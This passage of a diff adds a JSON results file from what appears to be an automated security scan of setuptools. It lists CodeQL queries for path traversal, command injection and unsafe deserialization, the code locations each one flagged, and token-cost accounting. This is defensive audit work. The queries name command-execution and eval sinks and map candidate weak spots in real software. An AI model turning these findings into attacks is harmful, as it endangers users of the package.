+              "endColumn": 22
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for rev"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 879,
+              "startColumn": 16,
+              "endColumn": 24
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for Tuple"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 902,
+              "startColumn": 20,
+              "endColumn": 70
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for Attribute()"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 902,
+              "startColumn": 14,
+              "endColumn": 17
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for rev"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 910,
+              "startColumn": 17,
+              "endLine": 914,
+              "endColumn": 18
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for BinaryExpr"
+            }
+           }
+          }
+         ]
+        }
+       ]
+      }
+     ],
+     "relatedLocations": [
+      {
+       "id": 1,
+       "physicalLocation": {
+        "artifactLocation": {
+         "uri": "setuptools/package_index.py",
+         "uriBaseId": "%SRCROOT%",
+         "index": 0
+        },
+        "region": {
+         "startLine": 910,
+         "startColumn": 17,
+         "endLine": 914,
+         "endColumn": 18
+        }
+       },
+       "message": {
+        "text": "command"
+       }
+      },
+      {
+       "physicalLocation": {
+        "artifactLocation": {
+         "uri": "setuptools/package_index.py",
+         "uriBaseId": "%SRCROOT%",
+         "index": 0
+        },
+        "region": {
+         "startLine": 817,
+         "startColumn": 37,
+         "endColumn": 40
+        }
+       }
+      },
+      {
+       "physicalLocation": {
+        "artifactLocation": {
+         "uri": "setuptools/package_index.py",
+         "uriBaseId": "%SRCROOT%",
+         "index": 0
+        },
+        "region": {
+         "startLine": 864,
+         "startColumn": 33,
+         "endColumn": 36
+        }
+       }
+      },
+      {
+       "physicalLocation": {
+        "artifactLocation": {
+         "uri": "setuptools/package_index.py",
+         "uriBaseId": "%SRCROOT%",
+         "index": 0
+        },
+        "region": {
+         "startLine": 900,
+         "startColumn": 28,
+         "endColumn": 31
+        }
+       }
+      }
+     ]
+    }
+   ]
+  },
+  {
+   "codeql_query_uuid": "20261119211950",
+   "codeql_raw_query": "/**\n * @name Unsafe archive extraction in setuptools\n * @description tarfile/zipfile extract calls without member validation can allow path traversal\n * @kind problem\n * @problem.severity warning\n * @id py/setuptools-unsafe-extract\n * @tags security\n *        external/cwe/cwe-022\n */\n\nimport python\nimport semmle.python.ApiGraphs\n\nfrom DataFlow::CallCfgNode call\nwhere\n  call = API::moduleImport(\"tarfile\").getMember(\"TarFile\").getReturn().getMember([\"extractall\", \"extract\"]).getACall()\n  or\n  call = API::moduleImport(\"zipfile\").getMember(\"ZipFile\").getReturn().getMember([\"extractall\", \"extract\"]).getACall()\n  or\n  call = API::moduleImport(\"tarfile\").getMember([\"open\", \"open\"]).getReturn().getMember([\"extractall\", \"extract\"]).getACall()\nselect call, \"Archive extracted without member path validation (possible zip slip).\"\n",
+   "hypothesis": "Zip-slip / tar path traversal in archive extraction helpers (archive_util, _distutils/archive_util, sandbox).",
+   "severity": "high",
+   "cwe_ids": [
+    "cwe-022"
+   ],
+   "results_count": 0,
+   "results": []
+  },
+  {
+   "codeql_query_uuid": "20261119212029",
+   "codeql_raw_query": "/**\n * @name Remote input to command execution\n * @description Remote/user-controlled input reaching command execution sinks outside vendored code\n * @kind problem\n * @problem.severity error\n * @id py/setuptools-remote-cmdi\n * @tags security\n *        external/cwe/cwe-078\n */\n\nimport python\nimport semmle.python.dataflow.new.DataFlow\nimport semmle.python.dataflow.new.TaintTracking\nimport semmle.python.dataflow.new.RemoteFlowSources\nimport semmle.python.Concepts\n\nmodule Cfg implements DataFlow::ConfigSig {\n  predicate isSource(DataFlow::Node source) { source instanceof RemoteFlowSource }\n\n  predicate isSink(DataFlow::Node sink) {\n    exists(DataFlow::CallCfgNode c |\n      sink = c.getArg(0) and\n      (\n        c = API::moduleImport(\"os\").getMember([\"system\", \"popen\", \"spawnl\", \"spawnv\", \"execv\", \"execvp\"]).getACall() or\n        c = API::moduleImport(\"subprocess\").getMember([\"call\", \"run\", \"Popen\", \"check_output\", \"check_call\", \"getoutput\", \"getstatusoutput\"]).getACall()\n      )\n    )\n  }\n}\n\nimport semmle.python.ApiGraphs\nmodule Flow = TaintTracking::Global<Cfg>;\n\nfrom DataFlow::Node source, DataFlow::Node sink\nwhere Flow::flow(source, sink)\nselect sink, \"Remote flow source reaches command execution sink.\"",
+   "hypothesis": "Remote/user input reaching os.system/subprocess outside package_index, e.g. bdist_rpm command injection",
+   "severity": "high",
+   "cwe_ids": [
+    "cwe-078"
+   ],
+   "results_count": 0,
+   "results": []
+  },
+  {
+   "codeql_query_uuid": "20261119212306",
+   "codeql_raw_query": "/**\n * @name setuptools unsafe archive extraction\n * @description Archive extraction primitives (Zip Slip / tar traversal candidates)\n * @kind problem\n * @problem.severity warning\n * @id py/setuptools-unsafe-extract\n */\nimport python\nimport semmle.python.ApiGraphs\n\nfrom DataFlow::CallCfgNode call, string name\nwhere\n  call = API::moduleImport(\"zipfile\").getMember([\"ZipFile\", \"extractall\"]).getACall() and\n  name = \"zipfile\"\n  or\n  call = API::moduleImport(\"tarfile\").getMember([\"TarFile\", \"open\", \"extractall\"]).getACall() and\n  name = \"tarfile\"\n  or\n  call = API::moduleImport(\"shutil\").getMember([\"unpack_archive\", \"unpack_tarfile\", \"unpack_zipfile\"]).getACall() and\n  name = \"shutil\"\nselect call, \"Archive extraction via \" + name",
+   "hypothesis": "Unsafe archive extraction allowing path traversal (Zip Slip) in setuptools archive_util / package_index",
+   "severity": "high",
+   "cwe_ids": [
+    "cwe-022"
+   ],
+   "results_count": 10,
+   "results": [
+    {
+     "ruleId": "py/setuptools-unsafe-extract",
+     "ruleIndex": 0,
+     "rule": {
+      "id": "py/setuptools-unsafe-extract",
+      "index": 0
+     },
+     "message": {
+      "text": "Archive extraction via zipfile"
+     },
+     "locations": [
+      {
+       "physicalLocation": {
+        "artifactLocation": {
+         "uri": "pkg_resources/__init__.py",
+         "uriBaseId": "%SRCROOT%",
+         "index": 0
+        },
+        "region": {
+         "startLine": 1761,
+         "startColumn": 14,
+         "endColumn": 35
+        }
+       }
+      }
+     ],
+     "partialFingerprints": {
+      "primaryLocationLineHash": "7c90a316c5c86acd:1",
+      "primaryLocationStartColumnFingerprint": "5"
+     }
+    },
+    {
+     "ruleId": "py/setuptools-unsafe-extract",
+     "ruleIndex": 0,
+     "rule": {
+      "id": "py/setuptools-unsafe-extract",
+      "index": 0
+     },
+     "message": {
+      "text": "Archive extraction via zipfile"
+     },
+     "locations": [
+      {
+       "physicalLocation": {
+        "artifactLocation": {
+         "uri": "setuptools/archive_util.py",
+         "uriBaseId": "%SRCROOT%",
+         "index": 1
+        },
+        "region": {
+         "startLine": 103,
+         "startColumn": 10,
+         "endColumn": 35
+        }
+       }
+      }
+     ],
+     "partialFingerprints": {
+      "primaryLocationLineHash": "c1d20ec7bb9a5827:1",
+      "primaryLocationStartColumnFingerprint": "5"
+     }
+    },
+    {
+     "ruleId": "py/setuptools-unsafe-extract",
+     "ruleIndex": 0,
+     "rule": {
+      "id": "py/setuptools-unsafe-extract",
+      "index": 0
+     },
+     "message": {
+      "text": "Archive extraction via tarfile"
+     },
+     "locations": [
+      {
+       "physicalLocation": {
+        "artifactLocation": {
+         "uri": "setuptools/archive_util.py",
+         "uriBaseId": "%SRCROOT%",
+         "index": 1
+        },
+        "region": {
+         "startLine": 195,
+         "startColumn": 18,
+         "endColumn": 40
+        }
+       }
+      }
+     ],
+     "partialFingerprints": {
+      "primaryLocationLineHash": "7de8e58ec535f5bb:1",
+      "primaryLocationStartColumnFingerprint": "9"
+     }
+    },
+    {
+     "ruleId": "py/setuptools-unsafe-extract",
+     "ruleIndex": 0,
+     "rule": {
+      "id": "py/setuptools-unsafe-extract",
+      "index": 0
+     },
+     "message": {
+      "text": "Archive extraction via tarfile"
+     },
+     "locations": [
+      {
+       "physicalLocation": {
+        "artifactLocation": {
+         "uri": "setuptools/_distutils/archive_util.py",
+         "uriBaseId": "%SRCROOT%",
+         "index": 2
+        },
+        "region": {
+         "startLine": 116,
+         "startColumn": 15,
+         "endColumn": 77
+        }
+       }
+      }
+     ],
+     "partialFingerprints": {
+      "primaryLocationLineHash": "d74565eff91cb7fb:1",
+      "primaryLocationStartColumnFingerprint": "6"
+     }
+    },
+    {
+     "ruleId": "py/setuptools-unsafe-extract",
+     "ruleIndex": 0,
+     "rule": {
+      "id": "py/setuptools-unsafe-extract",
+      "index": 0
+     },
+     "message": {
+      "text": "Archive extraction via zipfile"
+     },
+     "locations": [
+      {
+       "physicalLocation": {
+        "artifactLocation": {
+         "uri": "setuptools/_distutils/archive_util.py",
+         "uriBaseId": "%SRCROOT%",
+         "index": 2
+        },
+        "region": {
+         "startLine": 176,
+         "startColumn": 23,
+         "endLine": 178,
+         "endColumn": 18
+        }
+       }
+      }
+     ],
+     "partialFingerprints": {
+      "primaryLocationLineHash": "238393655330136e:1",
+      "primaryLocationStartColumnFingerprint": "6"
+     }
+    },
+    {
+     "ruleId": "py/setuptools-unsafe-extract",
+     "ruleIndex": 0,
+     "rule": {
+      "id": "py/setuptools-unsafe-extract",
+      "index": 0
+     },
+     "message": {
+      "text": "Archive extraction via zipfile"
+     },
+     "locations": [
+      {
+       "physicalLocation": {
+        "artifactLocation": {
+         "uri": "setuptools/_distutils/archive_util.py",
+         "uriBaseId": "%SRCROOT%",
+         "index": 2
+        },
+        "region": {
+         "startLine": 180,
+         "startColumn": 23,
+         "endColumn": 89
+        }
+       }
+      }
+     ],
+     "partialFingerprints": {
+      "primaryLocationLineHash": "b0b53c9caf95e9f0:1",
+      "primaryLocationStartColumnFingerprint": "6"
+     }
+    },
+    {
+     "ruleId": "py/setuptools-unsafe-extract",
+     "ruleIndex": 0,
+     "rule": {
+      "id": "py/setuptools-unsafe-extract",
+      "index": 0
+     },
+     "message": {
+      "text": "Archive extraction via zipfile"
+     },
+     "locations": [
+      {
+       "physicalLocation": {
+        "artifactLocation": {
+         "uri": "setuptools/command/bdist_egg.py",
+         "uriBaseId": "%SRCROOT%",
+         "index": 3
+        },
+        "region": {
+         "startLine": 454,
+         "startColumn": 13,
+         "endColumn": 73
+        }
+       }
+      }
+     ],
+     "partialFingerprints": {
+      "primaryLocationLineHash": "459788a65fa19070:1",
+      "primaryLocationStartColumnFingerprint": "4"
+     }
+    },
+    {
+     "ruleId": "py/setuptools-unsafe-extract",
+     "ruleIndex": 0,
+     "rule": {
+      "id": "py/setuptools-unsafe-extract",
+      "index": 0
+     },
+     "message": {
+      "text": "Archive extraction via zipfile"
+     },
+     "locations": [
+      {
+       "physicalLocation": {
+        "artifactLocation": {
+         "uri": "setuptools/command/easy_install.py",
+         "uriBaseId": "%SRCROOT%",
+         "index": 4
+        },
+        "region": {
+         "startLine": 1577,
+         "startColumn": 9,
+         "endColumn": 38
+        }
+       }
+      }
+     ],
+     "partialFingerprints": {
+      "primaryLocationLineHash": "9cd500dc8c3ed0b9:1",
+      "primaryLocationStartColumnFingerprint": "4"
+     }
+    },
+    {
+     "ruleId": "py/setuptools-unsafe-extract",
+     "ruleIndex": 0,
+     "rule": {
+      "id": "py/setuptools-unsafe-extract",
+      "index": 0
+     },
+     "message": {
+      "text": "Archive extraction via zipfile"
+     },
+     "locations": [
+      {
+       "physicalLocation": {
+        "artifactLocation": {
+         "uri": "setuptools/command/upload_docs.py",
+         "uriBaseId": "%SRCROOT%",
+         "index": 5
+        },
+        "region": {
+         "startLine": 79,
+         "startColumn": 20,
+         "endColumn": 50
+        }
+       }
+      }
+     ],
+     "partialFingerprints": {
+      "primaryLocationLineHash": "7ce94ba32269dc6e:1",
+      "primaryLocationStartColumnFingerprint": "11"
+     }
+    },
+    {
+     "ruleId": "py/setuptools-unsafe-extract",
+     "ruleIndex": 0,
+     "rule": {
+      "id": "py/setuptools-unsafe-extract",
+      "index": 0
+     },
+     "message": {
+      "text": "Archive extraction via zipfile"
+     },
+     "locations": [
+      {
+       "physicalLocation": {
+        "artifactLocation": {
+         "uri": "setuptools/wheel.py",
+         "uriBaseId": "%SRCROOT%",
+         "index": 6
+        },
+        "region": {
+         "startLine": 119,
+         "startColumn": 14,
+         "endColumn": 44
+        }
+       }
+      }
+     ],
+     "partialFingerprints": {
+      "primaryLocationLineHash": "bcf113b272d19594:1",
+      "primaryLocationStartColumnFingerprint": "5"
+     }
+    }
+   ]
+  },
+  {
+   "codeql_query_uuid": "20261119212517",
+   "codeql_raw_query": "/**\n * @name setuptools unsafe deserialization sites\n * @description pickle/marshal/eval usage outside vendored code\n * @kind problem\n * @problem.severity error\n * @id py/setuptools-deser\n * @tags security\n *        external/cwe/cwe-502\n */\nimport python\nimport semmle.python.ApiGraphs\n\nfrom DataFlow::CallCfgNode call\nwhere\n  not call.getLocation().getFile().getRelativePath().matches(\"%_vendor%\")\n  and not call.getLocation().getFile().getRelativePath().matches(\"%/_vendor/%\")\n  and (\n    call = API::moduleImport(\"pickle\").getMember([\"load\", \"loads\", \"Unpickler\"]).getACall()\n    or call = API::moduleImport(\"marshal\").getMember([\"load\", \"loads\"]).getACall()\n    or call = API::moduleImport(\"builtins\").getMember(\"eval\").getACall()\n    or call = API::moduleImport(\"builtins\").getMember(\"exec\").getACall()\n  )\nselect call, \"Unsafe deserialization/dynamic execution site\"",
+   "hypothesis": "Unsafe deserialization or dynamic code execution on untrusted data (CWE-502/CWE-95) in non-vendored setuptools code.",
+   "severity": "high",
+   "cwe_ids": [
+    "cwe-502",
+    "cwe-95"
+   ],
+   "results_count": 9,
+   "results": [
+    {
+     "ruleId": "py/setuptools-deser",
+     "ruleIndex": 0,
+     "rule": {
+      "id": "py/setuptools-deser",
+      "index": 0
+     },
+     "message": {
+      "text": "Unsafe deserialization/dynamic execution site"
+     },
+     "locations": [
+      {
+       "physicalLocation": {
+        "artifactLocation": {
+         "uri": "pkg_resources/__init__.py",
+         "uriBaseId": "%SRCROOT%",
+         "index": 0
+        },
+        "region": {
+         "startLine": 1544,
+         "startColumn": 13,
+         "endColumn": 45
+        }
+       }
+      }
+     ],
+     "partialFingerprints": {
+      "primaryLocationLineHash": "cf2541db4b01f1d0:1",
+      "primaryLocationStartColumnFingerprint": "0"
+     }
+    },
+    {
+     "ruleId": "py/setuptools-deser",
+     "ruleIndex": 0,
+     "rule": {
+      "id": "py/setuptools-deser",
+      "index": 0
+     },
+     "message": {
+      "text": "Unsafe deserialization/dynamic execution site"
+     },
+     "locations": [
+      {
+       "physicalLocation": {
+        "artifactLocation": {
+         "uri": "pkg_resources/__init__.py",
+         "uriBaseId": "%SRCROOT%",
+         "index": 0
+        },
+        "region": {
+         "startLine": 1555,
+         "startColumn": 13,
+         "endColumn": 52
+        }
+       }
+      }
+     ],
+     "partialFingerprints": {
+      "primaryLocationLineHash": "3a4e0f7bf43de3fc:1",
+      "primaryLocationStartColumnFingerprint": "0"
+     }
+    },
+    {
+     "ruleId": "py/setuptools-deser",
+     "ruleIndex": 0,
+     "rule": {
+      "id": "py/setuptools-deser",
+      "index": 0
+     },
+     "message": {
+      "text": "Unsafe deserialization/dynamic execution site"
+     },
+     "locations": [
+      {
+       "physicalLocation": {
+        "artifactLocation": {
+         "uri": "setuptools/command/bdist_egg.py",
+         "uriBaseId": "%SRCROOT%",
+         "index": 1
+        },
+        "region": {
+         "startLine": 375,
+         "startColumn": 12,
+         "endColumn": 27
+        }
+       }
+      }
+     ],
+     "partialFingerprints": {
+      "primaryLocationLineHash": "992c6d616af531bd:1",
+      "primaryLocationStartColumnFingerprint": "7"
+     }
+    },
+    {
+     "ruleId": "py/setuptools-deser",
+     "ruleIndex": 0,
+     "rule": {
+      "id": "py/setuptools-deser",
+      "index": 0
+     },
+     "message": {
+      "text": "Unsafe deserialization/dynamic execution site"
+     },
+     "locations": [
+      {
+       "physicalLocation": {
+        "artifactLocation": {
+         "uri": "setuptools/build_meta.py",
+         "uriBaseId": "%SRCROOT%",
+         "index": 2
+        },
+        "region": {
+         "startLine": 311,
+         "startColumn": 13,
+         "endColumn": 33
+        }
+       }
+      }
+     ],
+     "partialFingerprints": {
+      "primaryLocationLineHash": "4dc2dd946ed0250a:1",
+      "primaryLocationStartColumnFingerprint": "0"
+     }
+    },
+    {
+     "ruleId": "py/setuptools-deser",
+     "ruleIndex": 0,
+     "rule": {
+      "id": "py/setuptools-deser",
+      "index": 0
+     },
+     "message": {
+      "text": "Unsafe deserialization/dynamic execution site"
+     },
+     "locations": [
+      {
+       "physicalLocation": {
+        "artifactLocation": {
+         "uri": "setuptools/_distutils/ccompiler.py",
+         "uriBaseId": "%SRCROOT%",
+         "index": 3
+        },
+        "region": {
+         "startLine": 1011,
+         "startColumn": 28,
+         "endColumn": 42
+        }
+       }
+      }
+     ],
+     "partialFingerprints": {
+      "primaryLocationLineHash": "f6aa77ec1b833e79:1",
+      "primaryLocationStartColumnFingerprint": "19"
+     }
+    },
+    {
+     "ruleId": "py/setuptools-deser",
+     "ruleIndex": 0,
+     "rule": {
+      "id": "py/setuptools-deser",
+      "index": 0
+     },
+     "message": {
+      "text": "Unsafe deserialization/dynamic execution site"
+     },
+     "locations": [
+      {
+       "physicalLocation": {
+        "artifactLocation": {
+         "uri": "setuptools/_distutils/core.py",
+         "uriBaseId": "%SRCROOT%",
+         "index": 4
+        },
+        "region": {
+         "startLine": 267,
+         "startColumn": 17,
+         "endColumn": 30
+        }
+       }
+      }
+     ],
+     "partialFingerprints": {
+      "primaryLocationLineHash": "5d40ff63d209976e:1",
+      "primaryLocationStartColumnFingerprint": "0"
+     }
+    },
+    {
+     "ruleId": "py/setuptools-deser",
+     "ruleIndex": 0,
+     "rule": {
+      "id": "py/setuptools-deser",
+      "index": 0
+     },
+     "message": {
+      "text": "Unsafe deserialization/dynamic execution site"
+     },
+     "locations": [
+      {
+       "physicalLocation": {
+        "artifactLocation": {
+         "uri": "setuptools/depends.py",
+         "uriBaseId": "%SRCROOT%",
+         "index": 5
+        },
+        "region": {
+         "startLine": 114,
+         "startColumn": 20,
+         "endColumn": 35
+        }
+       }
+      }
+     ],
+     "partialFingerprints": {
+      "primaryLocationLineHash": "f46d8b8fc24f73ef:1",
+      "primaryLocationStartColumnFingerprint": "7"
+     }
+    },
+    {
+     "ruleId": "py/setuptools-deser",
+     "ruleIndex": 0,
+     "rule": {
+      "id": "py/setuptools-deser",
+      "index": 0
+     },
+     "message": {
+      "text": "Unsafe deserialization/dynamic execution site"
+     },
+     "locations": [
+      {
+       "physicalLocation": {
+        "artifactLocation": {
+         "uri": "setuptools/launch.py",
+         "uriBaseId": "%SRCROOT%",
+         "index": 6
+        },
+        "region": {
+         "startLine": 32,
+         "startColumn": 5,
+         "endColumn": 26
+        }
+       }
+      }
+     ],
+     "partialFingerprints": {
+      "primaryLocationLineHash": "89bcdedb088484d4:1",
+      "primaryLocationStartColumnFingerprint": "0"
+     }
+    },
+    {
+     "ruleId": "py/setuptools-deser",
+     "ruleIndex": 0,
+     "rule": {
+      "id": "py/setuptools-deser",
+      "index": 0
+     },
+     "message": {
+      "text": "Unsafe deserialization/dynamic execution site"
+     },
+     "locations": [
+      {
+       "physicalLocation": {
+        "artifactLocation": {
+         "uri": "setuptools/sandbox.py",
+         "uriBaseId": "%SRCROOT%",
+         "index": 7
+        },
+        "region": {
+         "startLine": 46,
+         "startColumn": 5,
+         "endColumn": 32
+        }
+       }
+      }
+     ],
+     "partialFingerprints": {
+      "primaryLocationLineHash": "56f72179d478425f:1",
+      "primaryLocationStartColumnFingerprint": "0"
+     }
+    }
+   ]
+  }
+ ],
+ "cache_usage": {
+  "prompt_tokens_total": 352694,
+  "uncached_input_tokens": 26038,
+  "cache_creation_input_tokens": 0,
+  "cache_read_input_tokens": 326656,
+  "output_tokens": 38052,
+  "calls": 18,
+  "caching_enabled": false,
+  "cost_usd_with_cache": 0.027717,
+  "cost_usd_no_cache": 0.075735,
+  "cache_read_share_of_prompt": 0.9262,
+  "prices_per_mtok": {
+   "claude-sonnet-4-5-20250929": {
+    "input": 3.0,
+    "output": 15.0
+   },
+   "claude-haiku-4-5-20251001": {
+    "input": 1.0,
+    "output": 5.0
+   },
+   "deepseek/deepseek-reasoner": {
+    "input": 0.15,
+    "output": 0.6,
+    "cache_read": 0.003,
+    "cache_write_mult": 1.0,
+    "peak_mult": 2.0
+   },
+   "gpt-5.1": {
+    "input": 1.25,
+    "output": 10.0,
+    "cache_read": 0.125,
+    "cache_write_mult": 1.0
+   },
+   "gpt-4.1": {
+    "input": 2.0,
+    "output": 8.0,
+    "cache_read": 0.5,
+    "cache_write_mult": 1.0
+   }
+  },
+  "cache_multipliers": {
+   "write_5m": 1.25,
+   "read": 0.1
+  }
+ }
+}
